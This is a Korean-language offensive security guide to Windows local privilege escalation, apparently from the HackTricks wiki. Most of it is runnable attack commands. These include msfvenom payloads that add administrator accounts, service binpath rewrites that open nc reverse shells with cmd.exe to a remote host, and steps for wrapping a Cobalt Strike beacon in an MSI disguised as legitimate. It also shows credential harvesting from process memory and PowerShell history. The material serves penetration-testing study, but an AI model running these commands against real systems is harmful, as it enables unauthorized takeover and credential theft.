# Windows Local Privilege Escalation

{{#include ../../banners/hacktricks-training.md}}

### **Windows local privilege escalation vectors를 찾기 위한 최고의 도구:** [**WinPEAS**](https://github.com/carlospolop/privilege-escalation-awesome-scripts-suite/tree/master/winPEAS)

## 초기 Windows 이론

### Access Tokens

**Windows Access Tokens가 무엇인지 모른다면, 계속하기 전에 다음 페이지를 읽으세요:**


{{#ref}}
access-tokens.md
{{#endref}}

### ACLs - DACLs/SACLs/ACEs

**ACLs - DACLs/SACLs/ACEs에 대한 자세한 정보는 다음 페이지를 확인하세요:**


{{#ref}}
acls-dacls-sacls-aces.md
{{#endref}}

### Integrity Levels

**Windows의 Integrity Levels가 무엇인지 모른다면, 계속하기 전에 다음 페이지를 읽으세요:**


{{#ref}}
integrity-levels.md
{{#endref}}

## Windows Security Controls

Windows에는 시스템을 **prevent you from enumerating the system**, 실행 파일 실행을 방해하거나 심지어 당신의 활동을 **detect your activities**할 수 있는 여러 요소가 있습니다. privilege escalation enumeration을 시작하기 전에 다음 **page**를 **read**하고 이러한 모든 **defenses** **mechanisms**을 **enumerate**해야 합니다:


{{#ref}}
../authentication-credentials-uac-and-efs/
{{#endref}}

## 시스템 정보

### Version info enumeration

Windows 버전에 알려진 취약점이 있는지 확인하세요(적용된 패치도 확인하세요).
```bash
systeminfo
systeminfo | findstr /B /C:"OS Name" /C:"OS Version" #Get only that information
wmic qfe get Caption,Description,HotFixID,InstalledOn #Patches
wmic os get osarchitecture || echo %PROCESSOR_ARCHITECTURE% #Get system architecture
```

```bash
[System.Environment]::OSVersion.Version #Current OS version
Get-WmiObject -query 'select * from win32_quickfixengineering' | foreach {$_.hotfixid} #List all patches
Get-Hotfix -description "Security update" #List only "Security Update" patches
```
### 버전 익스플로잇

이 [site](https://msrc.microsoft.com/update-guide/vulnerability)는 Microsoft 보안 취약점에 대한 자세한 정보를 찾는 데 유용합니다. 이 데이터베이스에는 4,700개 이상의 보안 취약점이 수록되어 있어 Windows 환경이 제공하는 **massive attack surface**를 보여줍니다.

**시스템에서**

- _post/windows/gather/enum_patches_
- _post/multi/recon/local_exploit_suggester_
- [_watson_](https://github.com/rasta-mouse/Watson)
- [_winpeas_](https://github.com/carlospolop/privilege-escalation-awesome-scripts-suite) _(Winpeas에 watson이 포함되어 있음)_

**시스템 정보로 로컬에서**

- [https://github.com/AonCyberLabs/Windows-Exploit-Suggester](https://github.com/AonCyberLabs/Windows-Exploit-Suggester)
- [https://github.com/bitsadmin/wesng](https://github.com/bitsadmin/wesng)

**Exploit 관련 Github 리포지토리:**

- [https://github.com/nomi-sec/PoC-in-GitHub](https://github.com/nomi-sec/PoC-in-GitHub)
- [https://github.com/abatchy17/WindowsExploits](https://github.com/abatchy17/WindowsExploits)
- [https://github.com/SecWiki/windows-kernel-exploits](https://github.com/SecWiki/windows-kernel-exploits)

### 환경

env variables에 자격증명/Juicy 정보가 저장되어 있나요?
```bash
set
dir env:
Get-ChildItem Env: | ft Key,Value -AutoSize
```
### PowerShell 기록
```bash
ConsoleHost_history #Find the PATH where is saved

type %userprofile%\AppData\Roaming\Microsoft\Windows\PowerShell\PSReadline\ConsoleHost_history.txt
type C:\Users\swissky\AppData\Roaming\Microsoft\Windows\PowerShell\PSReadline\ConsoleHost_history.txt
type $env:APPDATA\Microsoft\Windows\PowerShell\PSReadLine\ConsoleHost_history.txt
cat (Get-PSReadlineOption).HistorySavePath
cat (Get-PSReadlineOption).HistorySavePath | sls passw
```
### PowerShell Transcript 파일

이 기능을 활성화하는 방법은 [https://sid-500.com/2017/11/07/powershell-enabling-transcription-logging-by-using-group-policy/](https://sid-500.com/2017/11/07/powershell-enabling-transcription-logging-by-using-group-policy/)에서 확인할 수 있습니다.
```bash
#Check is enable in the registry
reg query HKCU\Software\Policies\Microsoft\Windows\PowerShell\Transcription
reg query HKLM\Software\Policies\Microsoft\Windows\PowerShell\Transcription
reg query HKCU\Wow6432Node\Software\Policies\Microsoft\Windows\PowerShell\Transcription
reg query HKLM\Wow6432Node\Software\Policies\Microsoft\Windows\PowerShell\Transcription
dir C:\Transcripts

#Start a Transcription session
Start-Transcript -Path "C:\transcripts\transcript0.txt" -NoClobber
Stop-Transcript
```
### PowerShell Module Logging

PowerShell 파이프라인 실행의 세부 정보가 기록되며, 실행된 명령, 명령 호출 및 스크립트의 일부가 포함됩니다. 다만 전체 실행 세부 정보와 출력 결과는 모두 캡처되지 않을 수 있습니다.

이를 활성화하려면 문서의 "Transcript files" 섹션에 있는 지침을 따르고 **"Module Logging"**을 선택하세요. **"Powershell Transcription"** 대신.
```bash
reg query HKCU\Software\Policies\Microsoft\Windows\PowerShell\ModuleLogging
reg query HKLM\Software\Policies\Microsoft\Windows\PowerShell\ModuleLogging
reg query HKCU\Wow6432Node\Software\Policies\Microsoft\Windows\PowerShell\ModuleLogging
reg query HKLM\Wow6432Node\Software\Policies\Microsoft\Windows\PowerShell\ModuleLogging
```
PowersShell 로그에서 마지막 15개 이벤트를 보려면 다음을 실행할 수 있습니다:
```bash
Get-WinEvent -LogName "windows Powershell" | select -First 15 | Out-GridView
```
### PowerShell **Script Block Logging**

스크립트 실행의 모든 활동과 전체 내용 기록이 캡처되어, 코드의 각 블록이 실행될 때마다 문서화됩니다. 이 프로세스는 각 활동에 대한 포괄적인 audit trail을 보존하며, forensics 및 malicious behavior 분석에 유용합니다. 실행 시점에 모든 활동을 문서화함으로써 프로세스에 대한 자세한 통찰을 제공합니다.
```bash
reg query HKCU\Software\Policies\Microsoft\Windows\PowerShell\ScriptBlockLogging
reg query HKLM\Software\Policies\Microsoft\Windows\PowerShell\ScriptBlockLogging
reg query HKCU\Wow6432Node\Software\Policies\Microsoft\Windows\PowerShell\ScriptBlockLogging
reg query HKLM\Wow6432Node\Software\Policies\Microsoft\Windows\PowerShell\ScriptBlockLogging
```
Script Block에 대한 로깅 이벤트는 Windows 이벤트 뷰어의 다음 경로에서 확인할 수 있습니다: **Application and Services Logs > Microsoft > Windows > PowerShell > Operational**.\
마지막 20개 이벤트를 보려면 다음을 사용할 수 있습니다:
```bash
Get-WinEvent -LogName "Microsoft-Windows-Powershell/Operational" | select -first 20 | Out-Gridview
```
### 인터넷 설정
```bash
reg query "HKCU\Software\Microsoft\Windows\CurrentVersion\Internet Settings"
reg query "HKLM\Software\Microsoft\Windows\CurrentVersion\Internet Settings"
```
### 드라이브
```bash
wmic logicaldisk get caption || fsutil fsinfo drives
wmic logicaldisk get caption,description,providername
Get-PSDrive | where {$_.Provider -like "Microsoft.PowerShell.Core\FileSystem"}| ft Name,Root
```
## WSUS

업데이트가 http**S**가 아니라 http로 요청되는 경우 시스템을 침해할 수 있습니다.

다음 명령을 cmd에서 실행하여 네트워크가 non-SSL WSUS 업데이트를 사용하는지 확인합니다:
```
reg query HKLM\Software\Policies\Microsoft\Windows\WindowsUpdate /v WUServer
```
또는 PowerShell에서 다음을 실행:
```
Get-ItemProperty -Path HKLM:\Software\Policies\Microsoft\Windows\WindowsUpdate -Name "WUServer"
```
다음과 같은 응답을 받는 경우:
```bash
HKEY_LOCAL_MACHINE\Software\Policies\Microsoft\Windows\WindowsUpdate
WUServer    REG_SZ    http://xxxx-updxx.corp.internal.com:8535
```

```bash
WUServer     : http://xxxx-updxx.corp.internal.com:8530
PSPath       : Microsoft.PowerShell.Core\Registry::HKEY_LOCAL_MACHINE\software\policies\microsoft\windows\windowsupdate
PSParentPath : Microsoft.PowerShell.Core\Registry::HKEY_LOCAL_MACHINE\software\policies\microsoft\windows
PSChildName  : windowsupdate
PSDrive      : HKLM
PSProvider   : Microsoft.PowerShell.Core\Registry
```
그리고 만약 `HKLM\Software\Policies\Microsoft\Windows\WindowsUpdate\AU /v UseWUServer` 또는 `Get-ItemProperty -Path hklm:\software\policies\microsoft\windows\windowsupdate\au -name "usewuserver"` 값이 `1`이면.

그렇다면, **악용 가능합니다.** 마지막 레지스트리 값이 `0`이면 WSUS 항목은 무시됩니다.

이 취약점을 악용하려면 다음과 같은 도구를 사용할 수 있습니다: [Wsuxploit](https://github.com/pimps/wsuxploit), [pyWSUS ](https://github.com/GoSecure/pywsus) - 이들은 non-SSL WSUS 트래픽에 'fake' 업데이트를 주입하기 위한 MiTM 무기화된 익스플로잇 스크립트입니다.

Read the research here:

{{#file}}
CTX_WSUSpect_White_Paper (1).pdf
{{#endfile}}

**WSUS CVE-2020-1013**

[**Read the complete report here**](https://www.gosecure.net/blog/2020/09/08/wsus-attacks-part-2-cve-2020-1013-a-windows-10-local-privilege-escalation-1-day/).\
기본적으로, 이 버그가 악용하는 결함은 다음과 같습니다:

> 만약 로컬 사용자 프록시를 수정할 권한이 있고, Windows Updates가 Internet Explorer의 설정에 구성된 프록시를 사용한다면, 우리는 [PyWSUS](https://github.com/GoSecure/pywsus)를 로컬에서 실행해 자신의 트래픽을 가로채고 자산에서 권한 상승된 사용자로 코드를 실행할 수 있는 권한을 가지게 됩니다.
>
> 또한 WSUS 서비스는 현재 사용자의 설정을 사용하므로 사용자 인증서 저장소도 사용합니다. WSUS 호스트명에 대해 자체 서명 인증서를 생성하고 이를 현재 사용자의 인증서 저장소에 추가하면 HTTP 및 HTTPS WSUS 트래픽 모두를 가로챌 수 있습니다. WSUS는 인증서에 대해 trust-on-first-use 유형의 검증을 구현할 HSTS-like 메커니즘을 사용하지 않습니다. 제시된 인증서가 사용자에 의해 신뢰되고 올바른 호스트명을 포함하면 서비스에서 이를 수락합니다.

이 취약점은 도구 [**WSUSpicious**](https://github.com/GoSecure/wsuspicious)를 사용해 악용할 수 있습니다 (도구가 확보되면).

## 제3자 Auto-Updaters 및 Agent IPC (local privesc)

많은 엔터프라이즈 에이전트는 localhost IPC 표면과 권한 있는 업데이트 채널을 노출합니다. 등록(enrollment)을 공격자 서버로 강제할 수 있고 업데이트 프로그램이 rogue root CA 또는 약한 서명 검증을 신뢰한다면, 로컬 사용자는 SYSTEM 서비스가 설치하는 악성 MSI를 전달할 수 있습니다. Netskope stAgentSvc 체인(CVE-2025-0309)을 기반으로 한 일반화된 기법은 다음을 참조하세요:

{{#ref}}
abusing-auto-updaters-and-ipc.md
{{#endref}}

## KrbRelayUp

Windows **domain** 환경의 특정 조건에서 **local privilege escalation** 취약점이 존재합니다. 이 조건에는 **LDAP signing이 강제되지 않는** 환경, 사용자가 **Resource-Based Constrained Delegation (RBCD)**를 구성할 수 있는 자체 권한(self-rights)을 보유한 경우, 그리고 사용자가 도메인 내에서 컴퓨터를 생성할 수 있는 능력이 포함됩니다. 이러한 **요구사항(requirements)**은 **기본 설정(default settings)**으로 충족된다는 점에 유의해야 합니다.

Find the **exploit in** [**https://github.com/Dec0ne/KrbRelayUp**](https://github.com/Dec0ne/KrbRelayUp)

For more information about the flow of the attack check [https://research.nccgroup.com/2019/08/20/kerberos-resource-based-constrained-delegation-when-an-image-change-leads-to-a-privilege-escalation/](https://research.nccgroup.com/2019/08/20/kerberos-resource-based-constrained-delegation-when-an-image-change-leads-to-a-privilege-escalation/)

## AlwaysInstallElevated

**If** 이 두 레지스트리가 **enabled**(값이 **0x1**) 되어 있다면, 모든 권한의 사용자가 `*.msi` 파일을 NT AUTHORITY\\**SYSTEM** 권한으로 **install**(실행)할 수 있습니다.
```bash
reg query HKCU\SOFTWARE\Policies\Microsoft\Windows\Installer /v AlwaysInstallElevated
reg query HKLM\SOFTWARE\Policies\Microsoft\Windows\Installer /v AlwaysInstallElevated
```
### Metasploit payloads
```bash
msfvenom -p windows/adduser USER=rottenadmin PASS=P@ssword123! -f msi-nouac -o alwe.msi #No uac format
msfvenom -p windows/adduser USER=rottenadmin PASS=P@ssword123! -f msi -o alwe.msi #Using the msiexec the uac wont be prompted
```
If you have a meterpreter session you can automate this technique using the module **`exploit/windows/local/always_install_elevated`**

### PowerUP

power-up의 `Write-UserAddMSI` 명령을 사용해 현재 디렉터리에 권한 상승을 위한 Windows MSI 바이너리를 생성하세요. 이 스크립트는 사용자/그룹 추가를 요청하는 사전 컴파일된 MSI 설치 프로그램을 출력합니다(따라서 GIU 접근이 필요합니다):
```
Write-UserAddMSI
```
생성된 바이너리를 실행하기만 하면 권한을 상승시킬 수 있습니다.

### MSI Wrapper

이 튜토리얼을 읽어 MSI wrapper를 만드는 방법을 배우세요. 참고: **.bat** 파일은 단순히 **command lines**을 **execute**하려는 경우 래핑할 수 있습니다.


{{#ref}}
msi-wrapper.md
{{#endref}}

### Create MSI with WIX


{{#ref}}
create-msi-with-wix.md
{{#endref}}

### Create MSI with Visual Studio

- Cobalt Strike 또는 Metasploit으로 `C:\privesc\beacon.exe`에 **new Windows EXE TCP payload**를 생성합니다.
- **Visual Studio**를 열고 **Create a new project**를 선택한 다음 검색 상자에 "installer"를 입력합니다. **Setup Wizard** 프로젝트를 선택하고 **Next**를 클릭하세요.
- 프로젝트 이름을 **AlwaysPrivesc** 등으로 지정하고 위치는 **`C:\privesc`**를 사용합니다. **place solution and project in the same directory**를 선택하고 **Create**를 클릭하세요.
- **Next**를 계속 클릭하여 4단계 중 3단계(choose files to include)에 도달합니다. **Add**를 클릭하고 방금 생성한 Beacon payload를 선택한 다음 **Finish**를 클릭하세요.
- **Solution Explorer**에서 **AlwaysPrivesc** 프로젝트를 선택하고 **Properties**에서 **TargetPlatform**을 **x86**에서 **x64**로 변경합니다.
- 설치된 앱을 더 정당하게 보이게 하기 위해 **Author**와 **Manufacturer** 같은 다른 속성도 변경할 수 있습니다.
- 프로젝트를 우클릭하고 **View > Custom Actions**를 선택하세요.
- **Install**을 우클릭하고 **Add Custom Action**을 선택합니다.
- **Application Folder**를 더블클릭하고 **beacon.exe** 파일을 선택한 후 **OK**를 클릭하세요. 이렇게 하면 설치 프로그램이 실행되면 즉시 beacon payload가 실행됩니다.
- **Custom Action Properties**에서 **Run64Bit**를 **True**로 변경합니다.
- 마지막으로 빌드하세요.
- `File 'beacon-tcp.exe' targeting 'x64' is not compatible with the project's target platform 'x86'` 경고가 표시되면 플랫폼이 x64로 설정되어 있는지 확인하세요.

### MSI Installation

악성 `.msi` 파일을 백그라운드에서 설치하려면:
```
msiexec /quiet /qn /i C:\Users\Steve.INFERNO\Downloads\alwe.msi
```
이 취약점을 악용하려면 다음을 사용할 수 있습니다: _exploit/windows/local/always_install_elevated_

## 안티바이러스 및 탐지기

### 감사 설정

이 설정은 무엇이 **로그**로 기록되는지를 결정하므로, 주의해서 확인해야 합니다.
```
reg query HKLM\Software\Microsoft\Windows\CurrentVersion\Policies\System\Audit
```
### WEF

Windows Event Forwarding는 로그가 어디로 전송되는지 알아보는 것이 흥미롭다
```bash
reg query HKLM\Software\Policies\Microsoft\Windows\EventLog\EventForwarding\SubscriptionManager
```
### LAPS

**LAPS**는 도메인에 가입된 컴퓨터에서 각 비밀번호가 **고유하고 무작위이며 정기적으로 갱신되도록** 설계된 **로컬 Administrator 비밀번호 관리**를 위해 만들어졌습니다. 이러한 비밀번호는 Active Directory에 안전하게 저장되며 ACLs를 통해 충분한 권한이 부여된 사용자만 액세스하여 승인된 경우 로컬 Administrator 비밀번호를 볼 수 있습니다.


{{#ref}}
../active-directory-methodology/laps.md
{{#endref}}

### WDigest

활성화된 경우, **평문 비밀번호가 LSASS에 저장됩니다** (Local Security Authority Subsystem Service).\
[**More info about WDigest in this page**](../stealing-credentials/credentials-protections.md#wdigest).
```bash
reg query 'HKLM\SYSTEM\CurrentControlSet\Control\SecurityProviders\WDigest' /v UseLogonCredential
```
### LSA Protection

**Windows 8.1**부터 Microsoft는 Local Security Authority (LSA)에 대한 강화된 보호를 도입하여 신뢰할 수 없는 프로세스가 **메모리를 읽는 것**이나 코드 주입을 시도하는 것을 **차단**함으로써 시스템 보안을 강화했습니다.\
[**LSA Protection에 대한 자세한 정보는 여기**](../stealing-credentials/credentials-protections.md#lsa-protection).
```bash
reg query 'HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Control\LSA' /v RunAsPPL
```
### Credentials Guard

**Credential Guard**는 **Windows 10**에 도입되었습니다. 그 목적은 기기에 저장된 자격 증명을 pass-the-hash 공격과 같은 위협으로부터 보호하는 것입니다.| [**More info about Credentials Guard here.**](../stealing-credentials/credentials-protections.md#credential-guard)
```bash
reg query 'HKLM\System\CurrentControlSet\Control\LSA' /v LsaCfgFlags
```
### Cached Credentials

**Domain credentials**는 **Local Security Authority** (LSA)에 의해 인증되며 운영 체제 구성 요소에서 사용됩니다. 등록된 security package가 사용자의 로그온 데이터를 인증하면, 일반적으로 해당 사용자에 대한 domain credentials가 생성됩니다.\
[**More info about Cached Credentials here**](../stealing-credentials/credentials-protections.md#cached-credentials).
```bash
reg query "HKEY_LOCAL_MACHINE\SOFTWARE\MICROSOFT\WINDOWS NT\CURRENTVERSION\WINLOGON" /v CACHEDLOGONSCOUNT
```
## 사용자 및 그룹

### 사용자 및 그룹 열거

자신이 속한 그룹 중 흥미로운 권한을 가진 그룹이 있는지 확인하세요.
```bash
# CMD
net users %username% #Me
net users #All local users
net localgroup #Groups
net localgroup Administrators #Who is inside Administrators group
whoami /all #Check the privileges

# PS
Get-WmiObject -Class Win32_UserAccount
Get-LocalUser | ft Name,Enabled,LastLogon
Get-ChildItem C:\Users -Force | select Name
Get-LocalGroupMember Administrators | ft Name, PrincipalSource
```
### 특권 그룹

만약 당신이 **특권 그룹에 속해 있다면 권한을 상승시킬 수 있습니다**. 여기에서 특권 그룹과 이를 악용해 권한을 상승시키는 방법을 알아보세요:


{{#ref}}
../active-directory-methodology/privileged-groups-and-token-privileges.md
{{#endref}}

### Token 조작

**자세히 알아보기**: 이 페이지에서 **token**이 무엇인지 확인하세요: [**Windows Tokens**](../authentication-credentials-uac-and-efs/index.html#access-tokens).\
다음 페이지를 확인하여 **흥미로운 token들에 대해 배우고** 이를 악용하는 방법을 알아보세요:


{{#ref}}
privilege-escalation-abusing-tokens.md
{{#endref}}

### 로그인된 사용자 / 세션
```bash
qwinsta
klist sessions
```
### 홈 폴더
```bash
dir C:\Users
Get-ChildItem C:\Users
```
### 비밀번호 정책
```bash
net accounts
```
### 클립보드의 내용 가져오기
```bash
powershell -command "Get-Clipboard"
```
## 실행 중인 프로세스

### 파일 및 폴더 권한

무엇보다 먼저, 프로세스를 나열할 때 **프로세스의 명령줄에 비밀번호가 있는지 확인하세요**.\  
실행 중인 일부 바이너리를 **덮어쓸 수 있는지** 또는 바이너리 폴더에 쓰기 권한이 있어 잠재적인 [**DLL Hijacking attacks**](dll-hijacking/index.html)을 악용할 수 있는지 확인하세요:
```bash
Tasklist /SVC #List processes running and services
tasklist /v /fi "username eq system" #Filter "system" processes

#With allowed Usernames
Get-WmiObject -Query "Select * from Win32_Process" | where {$_.Name -notlike "svchost*"} | Select Name, Handle, @{Label="Owner";Expression={$_.GetOwner().User}} | ft -AutoSize

#Without usernames
Get-Process | where {$_.ProcessName -notlike "svchost*"} | ft ProcessName, Id
```
항상 [**electron/cef/chromium debuggers** 실행 중인지 확인하세요, 이를 악용해 권한을 상승시킬 수 있습니다](../../linux-hardening/privilege-escalation/electron-cef-chromium-debugger-abuse.md).

**프로세스 바이너리의 권한 확인**
```bash
for /f "tokens=2 delims='='" %%x in ('wmic process list full^|find /i "executablepath"^|find /i /v "system32"^|find ":"') do (
for /f eol^=^"^ delims^=^" %%z in ('echo %%x') do (
icacls "%%z"
2>nul | findstr /i "(F) (M) (W) :\\" | findstr /i ":\\ everyone authenticated users todos %username%" && echo.
)
)
```
**프로세스 바이너리의 폴더 권한 확인 (**[**DLL Hijacking**](dll-hijacking/index.html)**)**
```bash
for /f "tokens=2 delims='='" %%x in ('wmic process list full^|find /i "executablepath"^|find /i /v
"system32"^|find ":"') do for /f eol^=^"^ delims^=^" %%y in ('echo %%x') do (
icacls "%%~dpy\" 2>nul | findstr /i "(F) (M) (W) :\\" | findstr /i ":\\ everyone authenticated users
todos %username%" && echo.
)
```
### Memory Password mining

프로세스의 메모리 덤프를 생성하려면 sysinternals의 **procdump**를 사용할 수 있습니다. FTP와 같은 서비스는 **credentials in clear text in memory**를 가지고 있으므로, 메모리를 덤프하여 credentials를 읽어보세요.
```bash
procdump.exe -accepteula -ma <proc_name_tasklist>
```
### 취약한 GUI 앱

**SYSTEM으로 실행되는 애플리케이션은 사용자가 CMD를 실행하거나 디렉터리를 탐색할 수 있게 허용할 수 있습니다.**

예: "Windows Help and Support" (Windows + F1)에서 "command prompt"를 검색한 다음 "Click to open Command Prompt"를 클릭하세요

## 서비스

Service Triggers는 특정 조건(named pipe/RPC endpoint activity, ETW events, IP availability, device arrival, GPO refresh, etc.)이 발생할 때 Windows가 서비스를 시작하도록 합니다. SERVICE_START 권한이 없어도 트리거를 작동시켜 권한 있는 서비스를 시작할 수 있는 경우가 많습니다. 열거 및 활성화 기법은 다음을 참조하세요:

-
{{#ref}}
service-triggers.md
{{#endref}}

서비스 목록 가져오기:
```bash
net start
wmic service list brief
sc query
Get-Service
```
### 권한

서비스 정보를 얻으려면 **sc**를 사용할 수 있습니다.
```bash
sc qc <service_name>
```
각 서비스에 필요한 권한 수준을 확인하려면 _Sysinternals_의 바이너리 **accesschk**를 사용하는 것이 권장됩니다.
```bash
accesschk.exe -ucqv <Service_Name> #Check rights for different groups
```
"Authenticated Users"가 어떤 서비스를 수정할 수 있는지 확인하는 것이 권장됩니다:
```bash
accesschk.exe -uwcqv "Authenticated Users" * /accepteula
accesschk.exe -uwcqv %USERNAME% * /accepteula
accesschk.exe -uwcqv "BUILTIN\Users" * /accepteula 2>nul
accesschk.exe -uwcqv "Todos" * /accepteula ::Spanish version
```
[You can download accesschk.exe for XP for here](https://github.com/ankh2054/windows-pentest/raw/master/Privelege/accesschk-2003-xp.exe)

### 서비스 활성화

다음과 같은 오류가 발생하는 경우(예: SSDPSRV):

_시스템 오류 1058이 발생했습니다._\
_해당 서비스는 비활성화되어 있거나 연결된 활성화된 장치가 없어 시작할 수 없습니다._

다음 명령을 사용하여 활성화할 수 있습니다
```bash
sc config SSDPSRV start= demand
sc config SSDPSRV obj= ".\LocalSystem" password= ""
```
**upnphost 서비스가 작동하려면 SSDPSRV에 의존한다는 점을 고려하세요 (XP SP1의 경우)**

**또 다른 해결 방법**은 이 문제를 해결하기 위해 다음을 실행하는 것입니다:
```
sc.exe config usosvc start= auto
```
### **서비스 바이너리 경로 수정**

서비스에서 "Authenticated users" 그룹이 **SERVICE_ALL_ACCESS** 권한을 가지고 있는 경우, 서비스의 실행 바이너리를 수정할 수 있습니다. 서비스 바이너리를 수정하고 실행하려면 **sc**:
```bash
sc config <Service_Name> binpath= "C:\nc.exe -nv 127.0.0.1 9988 -e C:\WINDOWS\System32\cmd.exe"
sc config <Service_Name> binpath= "net localgroup administrators username /add"
sc config <Service_Name> binpath= "cmd \c C:\Users\nc.exe 10.10.10.10 4444 -e cmd.exe"

sc config SSDPSRV binpath= "C:\Documents and Settings\PEPE\meter443.exe"
```
### 서비스 재시작
```bash
wmic service NAMEOFSERVICE call startservice
net stop [service name] && net start [service name]
```
권한은 다음과 같은 다양한 권한을 통해 상승할 수 있습니다:

- **SERVICE_CHANGE_CONFIG**: 서비스 바이너리의 재구성을 허용합니다.
- **WRITE_DAC**: 권한 재구성을 가능하게 하여 서비스 구성 변경 권한을 얻을 수 있습니다.
- **WRITE_OWNER**: 소유권 획득 및 권한 재구성을 허용합니다.
- **GENERIC_WRITE**: 서비스 구성 변경 권한을 상속합니다.
- **GENERIC_ALL**: 역시 서비스 구성 변경 권한을 상속합니다.

이 취약점의 탐지 및 악용에는 _exploit/windows/local/service_permissions_를 사용할 수 있습니다.

### 서비스 바이너리의 약한 권한

**서비스가 실행하는 바이너리를 수정할 수 있는지** 또는 바이너리가 위치한 폴더에 **쓰기 권한이 있는지** 확인하세요 ([**DLL Hijacking**](dll-hijacking/index.html)).  
서비스가 실행하는 모든 바이너리는 **wmic**(system32가 아님)를 사용해 얻을 수 있으며, 권한은 **icacls**로 확인하세요:
```bash
for /f "tokens=2 delims='='" %a in ('wmic service list full^|find /i "pathname"^|find /i /v "system32"') do @echo %a >> %temp%\perm.txt

for /f eol^=^"^ delims^=^" %a in (%temp%\perm.txt) do cmd.exe /c icacls "%a" 2>nul | findstr "(M) (F) :\"
```
또한 **sc** 및 **icacls**를 사용할 수 있습니다:
```bash
sc query state= all | findstr "SERVICE_NAME:" >> C:\Temp\Servicenames.txt
FOR /F "tokens=2 delims= " %i in (C:\Temp\Servicenames.txt) DO @echo %i >> C:\Temp\services.txt
FOR /F %i in (C:\Temp\services.txt) DO @sc qc %i | findstr "BINARY_PATH_NAME" >> C:\Temp\path.txt
```
### 서비스 레지스트리 수정 권한

수정할 수 있는 서비스 레지스트리가 있는지 확인해야 합니다.\
다음과 같이 서비스 **레지스트리**에 대한 **권한**을 **확인**할 수 있습니다:
```bash
reg query hklm\System\CurrentControlSet\Services /s /v imagepath #Get the binary paths of the services

#Try to write every service with its current content (to check if you have write permissions)
for /f %a in ('reg query hklm\system\currentcontrolset\services') do del %temp%\reg.hiv 2>nul & reg save %a %temp%\reg.hiv 2>nul && reg restore %a %temp%\reg.hiv 2>nul && echo You can modify %a

get-acl HKLM:\System\CurrentControlSet\services\* | Format-List * | findstr /i "<Username> Users Path Everyone"
```
서비스가 실행하는 바이너리를 변경할 수 있는지 확인하려면 **Authenticated Users** 또는 **NT AUTHORITY\INTERACTIVE**가 `FullControl` 권한을 가지고 있는지 확인해야 합니다. 만약 그렇다면, 서비스가 실행하는 바이너리를 변경할 수 있습니다.

실행되는 바이너리의 Path를 변경하려면:
```bash
reg add HKLM\SYSTEM\CurrentControlSet\services\<service_name> /v ImagePath /t REG_EXPAND_SZ /d C:\path\new\binary /f
```
### 서비스 레지스트리 AppendData/AddSubdirectory 권한

레지스트리에 대해 이 권한을 가지고 있다면 **해당 레지스트리에서 하위 레지스트리를 생성할 수 있다**는 뜻입니다. Windows services의 경우 이는 **임의의 코드를 실행하는 데 충분합니다:**


{{#ref}}
appenddata-addsubdirectory-permission-over-service-registry.md
{{#endref}}

### 인용부호 없는 서비스 경로

실행 파일 경로가 따옴표로 감싸져 있지 않으면, Windows는 공백 이전의 각 경로 조각을 차례로 실행하려고 시도합니다.

예를 들어, 경로 _C:\Program Files\Some Folder\Service.exe_ 의 경우 Windows는 다음을 실행하려고 시도합니다:
```bash
C:\Program.exe
C:\Program Files\Some.exe
C:\Program Files\Some Folder\Service.exe
```
내장 Windows 서비스에 속한 항목은 제외하고, 인용 부호가 없는 모든 서비스 경로를 나열하세요:
```bash
wmic service get name,pathname,displayname,startmode | findstr /i auto | findstr /i /v "C:\Windows\\" | findstr /i /v '\"'
wmic service get name,displayname,pathname,startmode | findstr /i /v "C:\\Windows\\system32\\" |findstr /i /v '\"'  # Not only auto services

# Using PowerUp.ps1
Get-ServiceUnquoted -Verbose
```

```bash
for /f "tokens=2" %%n in ('sc query state^= all^| findstr SERVICE_NAME') do (
for /f "delims=: tokens=1*" %%r in ('sc qc "%%~n" ^| findstr BINARY_PATH_NAME ^| findstr /i /v /l /c:"c:\windows\system32" ^| findstr /v /c:""""') do (
echo %%~s | findstr /r /c:"[a-Z][ ][a-Z]" >nul 2>&1 && (echo %%n && echo %%~s && icacls %%s | findstr /i "(F) (M) (W) :\" | findstr /i ":\\ everyone authenticated users todos %username%") && echo.
)
)
```

```bash
gwmi -class Win32_Service -Property Name, DisplayName, PathName, StartMode | Where {$_.StartMode -eq "Auto" -and $_.PathName -notlike "C:\Windows*" -and $_.PathName -notlike '"*'} | select PathName,DisplayName,Name
```
**이 취약점을 탐지하고 악용할 수 있습니다** metasploit으로: `exploit/windows/local/trusted\_service\_path` metasploit으로 수동으로 서비스 바이너리를 생성할 수 있습니다:
```bash
msfvenom -p windows/exec CMD="net localgroup administrators username /add" -f exe-service -o service.exe
```
### 복구 조치

Windows는 서비스가 실패했을 때 취할 조치를 사용자가 지정할 수 있도록 합니다. 이 기능은 특정 binary를 가리키도록 구성할 수 있습니다. 이 binary를 교체할 수 있다면 privilege escalation이 발생할 수 있습니다. 자세한 내용은 [공식 문서](<https://docs.microsoft.com/en-us/previous-versions/windows/it-pro/windows-server-2008-R2-and-2008/cc753662(v=ws.11)?redirectedfrom=MSDN>)에서 확인하세요.

## 애플리케이션

### 설치된 애플리케이션

**permissions of the binaries**와 **folders**를 확인하세요 (아마 하나를 덮어써서 escalate privileges할 수 있을지도 모릅니다) ([DLL Hijacking](dll-hijacking/index.html)).
```bash
dir /a "C:\Program Files"
dir /a "C:\Program Files (x86)"
reg query HKEY_LOCAL_MACHINE\SOFTWARE

Get-ChildItem 'C:\Program Files', 'C:\Program Files (x86)' | ft Parent,Name,LastWriteTime
Get-ChildItem -path Registry::HKEY_LOCAL_MACHINE\SOFTWARE | ft Name
```
### 쓰기 권한

특정 config file을 수정해 특정 파일을 읽을 수 있는지, 또는 Administrator account (schedtasks)에 의해 실행될 binary를 수정할 수 있는지 확인하세요.

시스템에서 취약한 폴더/파일 권한을 찾는 방법은 다음과 같습니다:
```bash
accesschk.exe /accepteula
# Find all weak folder permissions per drive.
accesschk.exe -uwdqs Users c:\
accesschk.exe -uwdqs "Authenticated Users" c:\
accesschk.exe -uwdqs "Everyone" c:\
# Find all weak file permissions per drive.
accesschk.exe -uwqs Users c:\*.*
accesschk.exe -uwqs "Authenticated Users" c:\*.*
accesschk.exe -uwdqs "Everyone" c:\*.*
```

```bash
icacls "C:\Program Files\*" 2>nul | findstr "(F) (M) :\" | findstr ":\ everyone authenticated users todos %username%"
icacls ":\Program Files (x86)\*" 2>nul | findstr "(F) (M) C:\" | findstr ":\ everyone authenticated users todos %username%"
```

```bash
